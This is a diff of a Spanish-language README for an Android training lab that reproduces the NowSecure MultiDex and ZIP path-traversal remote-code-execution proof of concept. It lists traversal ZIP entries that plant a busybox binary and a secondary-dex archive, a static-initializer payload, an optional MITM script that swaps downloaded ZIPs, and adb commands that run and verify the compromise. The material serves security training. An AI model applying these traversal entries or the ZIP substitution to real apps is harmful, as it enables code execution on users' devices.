@@ -1,153 +1,126 @@
-# RCE Lab - Cyber Range
+# RCE Lab - My Talking Tom PoC Replication
 
-Laboratorio de Ejecución de Código Remoto (RCE) para entrenamiento en ciberseguridad.
+## Overview
 
-## 🎯 Descripción
+Este laboratorio replica **exactamente** la vulnerabilidad del PoC "My Talking Tom" que utiliza:
 
-Este proyecto replica la vulnerabilidad de RCE descrita en el [artículo de NowSecure](https://www.nowsecure.com/blog/2017/06/15/a-pattern-for-remote-code-execution-using-arbitrary-file-writes-and-multidex-applications/) sobre patrones de ejecución remota usando escritura arbitraria de archivos y aplicaciones MultiDex.
+- **Path traversal ZIP** para colocar archivos maliciosos automáticamente
+- **MultiDex 1.0.1** que carga automáticamente `classes2.zip` desde `code_cache/secondary-dexes/`
+- **Static initializer** en payload DEX para ejecución automática al cargar la clase
 
-**Diseñado para Cyber Range**: La aplicación ejecuta verificaciones automáticas cada 15 segundos sin intervención del usuario.
+## Arquitectura del Ataque
 
-## ⚡ Características Principales
-
-### Comportamiento Automático
-
-- **Servicio de Background**: Se ejecuta automáticamente al iniciar la app
-- **Verificaciones Periódicas**: Cada 15 segundos busca payloads nuevos
-- **Persistencia**: Se reinicia automáticamente al arrancar el dispositivo
-- **Sin Intervención del Usuario**: Perfecto para escenarios de cyber range
-
-### Vulnerabilidades Simuladas
-
-- **Descarga No Validada**: Descarga ZIPs sin verificar origen
-- **Carga Dinámica de DEX**: Ejecuta código sin validación
-- **Escritura Arbitraria**: Extrae archivos sin restricciones
-- **MultiDex**: Aprovecha la funcionalidad de múltiples DEX
-
-## 🏗️ Arquitectura
-
-```
-RCE Lab/
-├── app/src/main/java/com/app/lab/rce/
-│   ├── MainActivity.kt          # Actividad principal con UI
-│   ├── MainScreen.kt           # Interfaz de usuario (Compose)
-│   ├── AdUpdateService.kt      # Servicio automático de verificación
-│   ├── BootReceiver.kt         # Persistencia al arranque
-│   ├── CompromiseReceiver.kt   # Manejo de notificaciones
-│   └── VulnerableReceiver.kt   # Receiver vulnerable (legacy)
-├── payload/src/pwn/
-│   └── Shell.java              # Payload malicioso
-└── build_payload.sh            # Script para compilar payload
+```text
+           ┌─────────┐                                     ┌───────────────┐
+           │  MITM   │─── inyecta 2 entradas con traversals ─▶ /data/data/ │
+  legit    │ script  │                                         com.app.lab. │
+Creative ─▶│ (zip)   │── busybox  → …/files/busybox            rce/         │
+  .zip     └─────────┘── classes2.zip → …/code_cache/…         …            │
+                                                               └─────────────┘
+                         ▼                                        ▲
+                    AdUpdateService                 MultiDex 1.x carga
+                  descomprime el ZIP                <pkg>-classes2.zip
+                                                   (contiene classes.dex)
 ```
 
-## 🚀 Configuración Rápida
-
-### 1. Compilar Payload
+## Comandos Rápidos
 
 ```bash
+# 1. Construir exploit bundle con path traversal
 ./build_payload.sh
-```
 
-### 2. Servir Payload
+# 2. Servir exploit bundle
+cd payload/build && python3 -m http.server 8000 &
 
-```bash
-cd payload/build && python3 -m http.server 8000
-```
+# 3. Setup dispositivo Android (emulador)
+adb reverse tcp:8000 tcp:8000
 
-### 3. Instalar App
-
-```bash
+# 4. Instalar aplicación vulnerable
 ./gradlew installDebug
+
+# 5. Iniciar aplicación (descarga automática del exploit)
+adb shell am start -n com.app.lab.rce/.MainActivity
+
+# 6. Reiniciar para activar MultiDex auto-load
+adb shell am force-stop com.app.lab.rce
+adb shell am start -n com.app.lab.rce/.MainActivity
+
+# 7. Verificar compromiso
+adb shell cat /data/data/com.app.lab.rce/files/pwned.txt
 ```
 
-## 📱 Flujo Automático
+## Componentes Técnicos
 
-1. **Inicio**: La app se inicia automáticamente
-2. **Servicio**: Se activa el servicio de background
-3. **Verificación**: Cada 15 segundos verifica `http://10.0.2.2:8000/payload.zip`
-4. **Descarga**: Si encuentra el payload, lo descarga automáticamente
-5. **Extracción**: Extrae el DEX del ZIP
-6. **Ejecución**: Carga y ejecuta el código malicioso
-7. **Compromiso**: Notifica que el sistema fue comprometido
+### 1. Exploit Bundle (`exploit_bundle.zip`)
 
-## 🔍 Monitoring
+Contiene dos entradas con path traversal:
 
-### Logs en Tiempo Real
+- `../../../../data/data/com.app.lab.rce/files/busybox` (ejecutable)
+- `../../../../data/data/com.app.lab.rce/code_cache/secondary-dexes/com.app.lab.rce-classes2.zip`
+
+### 2. Aplicación Vulnerable
+
+- **MultiDex 1.0.1**: Carga automáticamente ZIPs desde `secondary-dexes/`
+- **AdUpdateService**: Descarga y extrae ZIPs cada 15 segundos
+- **RCEApplication**: Custom Application con `MultiDex.install()`
+
+### 3. Payload Malicioso
+
+- **Solo 15 líneas**: Payload extremadamente simple y directo
+- **Static initializer**: Se ejecuta automáticamente al cargar la clase
+- **Evidencia simple**: Crea `/data/data/com.app.lab.rce/files/pwned.txt` con fecha y UID
+- **Sin dependencias**: No requiere Context ni librerías Android
+
+### 4. MITM Script (Opcional)
+
+- **Sustitución directa**: Reemplaza cualquier ZIP descargado por `exploit_bundle.zip`
+- **Filtro inteligente**: Solo intercepta archivos `.zip` con magic bytes `PK`
+- **Simple y efectivo**: 40 líneas vs 135 líneas anterior
+
+## Archivos Clave
+
+```
+├── build_payload.sh              # Construye exploit_bundle.zip
+├── app/src/main/java/com/app/lab/rce/
+│   ├── RCEApplication.kt          # Custom Application (MultiDex)
+│   ├── AdUpdateService.kt         # Descarga y extrae ZIPs
+│   └── MainActivity.kt            # Inicia servicio automático
+├── payload/src/pwn/Shell.java     # Payload con static initializer
+└── mitmproxy/inject_payload.py    # MITM para inyección (opcional)
+```
+
+## Indicadores de Compromiso
+
+### Logs Esperados
+```
+# MultiDex carga automáticamente el payload
+# No hay logs específicos - el payload es silencioso
+```
+
+### Archivos Creados
+
+- `/data/data/com.app.lab.rce/files/pwned.txt` - Evidencia principal del compromiso
+- `/data/data/com.app.lab.rce/files/busybox` (ejecutable)
+- `/data/data/com.app.lab.rce/code_cache/secondary-dexes/com.app.lab.rce-classes2.zip`
+
+## Verificar Compromiso
 
 ```bash
-adb logcat | grep -E 'RCEService|RCE_PAYLOAD|MainActivity'
+# Verificar archivo de evidencia
+adb shell cat /data/data/com.app.lab.rce/files/pwned.txt
+# Ejemplo output: PWNED Mon Jun 23 21:16:45 GMT 2025 UID=uid=10XXX(com.app.lab.rce) gid=10XXX(com.app.lab.rce)
 ```
 
-### Eventos Clave
+## Consideraciones de Seguridad
 
-- `📡 Verificando actualizaciones...` - Verificación automática
-- `📦 Payload descargado` - Descarga exitosa
-- `💀 RCE EJECUTADA` - Compromiso exitoso
-- `🚨 SISTEMA COMPROMETIDO` - Notificación final
+⚠️ **Solo para uso educativo y de investigación**
 
-## 🎓 Uso en Cyber Range
+- Usar únicamente en entornos controlados
+- No ejecutar en dispositivos de producción
+- Respetar las leyes locales de ciberseguridad
 
-### Escenarios de Entrenamiento
+## Referencias
 
-1. **Análisis de Malware**: Observar comportamiento automático
-2. **Respuesta a Incidentes**: Detectar y responder al compromiso
-3. **Análisis Forense**: Investigar logs y artefactos
-4. **Mitigación**: Implementar contramedidas
-
-### Configuración de Red
-
-- **Emulador Android**: `10.0.2.2:8000`
-- **Dispositivo Real**: Ajustar IP en `AdUpdateService.kt`
-
-## ⚠️ Advertencias
-
-- **Solo para Entrenamiento**: No usar en producción
-- **Entorno Controlado**: Solo ejecutar en cyber ranges
-- **Monitoreo Requerido**: Supervisar toda la actividad
-
-## 🛡️ Contramedidas
-
-### Prevención
-
-- Validación de firmas digitales
-- Verificación de checksums
-- Certificate pinning
-- Restricciones de red
-
-### Detección
-
-- Monitoreo de tráfico HTTP
-- Análisis de logs del sistema
-- Detección de carga dinámica de DEX
-- Behavioral analysis
-
-## 📊 Métricas de Compromiso
-
-La app registra métricas detalladas:
-
-- Tiempo hasta compromiso
-- Fuente del payload
-- Método de ejecución
-- Persistencia establecida
-
-## 🔧 Personalización
-
-### Cambiar Intervalo de Verificación
-
-```kotlin
-// En AdUpdateService.kt
-private const val UPDATE_INTERVAL_MS = 15000L // 15 segundos
-```
-
-### Cambiar URL del Payload
-
-```kotlin
-// En AdUpdateService.kt
-private const val PAYLOAD_URL = "http://10.0.2.2:8000/payload.zip"
-```
-
-## 📚 Referencias
-
-- [NowSecure Article](https://www.nowsecure.com/blog/2017/06/15/a-pattern-for-remote-code-execution-using-arbitrary-file-writes-and-multidex-applications/)
-- [Android MultiDex](https://developer.android.com/studio/build/multidex)
-- [DexClassLoader](https://developer.android.com/reference/dalvik/system/DexClassLoader)
+- [NowSecure - MultiDex RCE Vulnerability](https://www.nowsecure.com/blog/2017/06/15/a-pattern-for-remote-code-execution-using-arbitrary-file-writes-and-multidex-applications/)
+- [My Talking Tom PoC](https://github.com/nowsecure/android-rce-multidex-and-zip-files)
+- [Android MultiDex Documentation](https://developer.android.com/studio/build/multidex)
